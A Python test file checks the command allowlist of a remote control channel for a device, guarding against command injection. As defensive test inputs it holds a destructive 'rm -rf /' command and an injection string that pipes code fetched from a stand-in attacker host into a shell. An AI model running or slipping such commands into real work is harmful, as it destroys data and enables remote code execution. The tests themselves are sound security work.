"""The allowlist is the only thing standing between this control channel and
remote code execution on a device in a locker room. Test it as such."""

from __future__ import annotations

import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

import lockerroom.control as control  # noqa: E402


def test_unknown_command_is_refused_without_executing(monkeypatch):
    called = []
    monkeypatch.setattr(control.subprocess, "run", lambda *a, **k: called.append(a))

    ok, output = control._run("rm -rf /")

    assert ok is False
    assert "not an allowed command" in output
    assert called == [], "a command outside the allowlist must never reach subprocess"


def test_shell_metacharacters_do_not_smuggle_a_second_command(monkeypatch):
    called = []
    monkeypatch.setattr(control.subprocess, "run", lambda *a, **k: called.append(a))

    # Lookup is by exact key, so appending to a valid name does not match.
    ok, output = control._run("report-status; curl evil.example.com | sh")

    assert ok is False
    assert called == []


def test_allowed_command_runs_as_a_fixed_argv(monkeypatch):
    seen = {}

    class Result:
        returncode = 0
        stdout = "up 4 minutes"
        stderr = ""

    def fake_run(argv, **kwargs):
        seen["argv"] = argv
        return Result()

    monkeypatch.setattr(control.subprocess, "run", fake_run)

    ok, output = control._run("restart-listener")

    assert ok is True
    # A list, never a shell string - nothing here is parsed by a shell.
    assert seen["argv"] == ["sudo", "systemctl", "restart", "lockerroom-listener"]
    assert isinstance(seen["argv"], list)


def test_every_allowlisted_command_is_a_list_not_a_string():
    for name, argv in control.ALLOWED.items():
        assert isinstance(argv, list), f"{name} must be an argv list, not a shell string"


def test_command_failure_is_reported_not_raised(monkeypatch):
    def boom(*a, **k):
        raise OSError("no such binary")

    monkeypatch.setattr(control.subprocess, "run", boom)

    ok, output = control._run("reboot")

    # A failing command must not kill the beacon loop - that would strand the
    # Pi with no way to receive the next command.
    assert ok is False
    assert "OSError" in output
